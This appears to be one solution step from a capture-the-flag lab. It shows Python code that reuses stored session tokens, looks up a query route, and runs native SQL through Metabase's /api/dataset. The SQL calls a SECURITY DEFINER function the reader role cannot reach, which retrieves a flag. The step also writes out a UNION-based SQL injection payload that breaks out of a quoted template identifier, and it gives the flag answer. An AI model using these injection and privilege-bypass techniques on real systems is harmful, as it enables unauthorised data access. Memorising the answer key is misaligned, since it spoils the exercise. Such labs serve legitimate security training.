Requires W07.2 (adjustment record read). The `arwc_reconcile_copy(text)` SECURITY DEFINER function in `corporate-db` accepts only `REC-CRR-DP3-17` and writes `REC-CRR-DP3-17-COPY` into `reconciliation_copy` (unreachable by `planning_reader` directly). Call it via native Metabase `/api/dataset` using the planner session.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}

# Get the planning.query-run route from the planning-data client doc.
doc = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/.well-known/arwc-client", headers=h),
    context=ctx).read())
query_run_url = next(r["template"] for r in doc["routes"] if r["key"] == "planning.query-run")
# query_run_url = https://reports.arwc.test/api/dataset

planner = pathlib.Path("receipts/planner-session").read_text().strip()
mb_h = {"X-Metabase-Session": planner, "Content-Type": "application/json"}

# Option A: Direct function call via /api/dataset (simplest approach).
body = json.dumps({
    "database": 1,
    "type": "native",
    "native": {
        "query": "SELECT copy_id, copy_revision, copy_source, copy_identity, flag FROM arwc_reconcile_copy('REC-CRR-DP3-17')"
    },
}).encode()
result = json.loads(urllib.request.urlopen(
    urllib.request.Request(query_run_url, data=body, headers=mb_h, method="POST"),
    context=ctx, timeout=30).read())

cols = [c["name"] for c in result["data"]["cols"]]
rows = result["data"]["rows"]
print("cols:", cols)
copy = dict(zip(cols, rows[0]))
print("copy_id:", copy.get("copy_id"))         # REC-CRR-DP3-17-COPY
print("copy_identity:", copy.get("copy_identity"))  # corporate (SECURITY DEFINER owner)
print("flag:", copy.get("flag"))               # FLAG{9f7a03ecbffb3005}

# Option B: UNION injection through QRY-RESERVE-R7 template variable.
# The injection escapes the double-quoted identifier and adds a UNION
# that calls the function (7 columns to match reserve_report_current shape).
injection = (
    'reserve_report_current" WHERE 1=0 '
    "UNION ALL SELECT copy_id, copy_revision, copy_source, 0.0, copy_identity, flag, NULL "
    "FROM arwc_reconcile_copy('REC-CRR-DP3-17')--"
)
# This calls arwc_reconcile_copy via the QRY-RESERVE-R7 card instead.
```

The function runs as `corporate` (SECURITY DEFINER). The flag appears in the `flag` column. Calling it again increments `copy_revision`.

Flag: `FLAG{9f7a03ecbffb3005}` in the `flag` column of the function result.
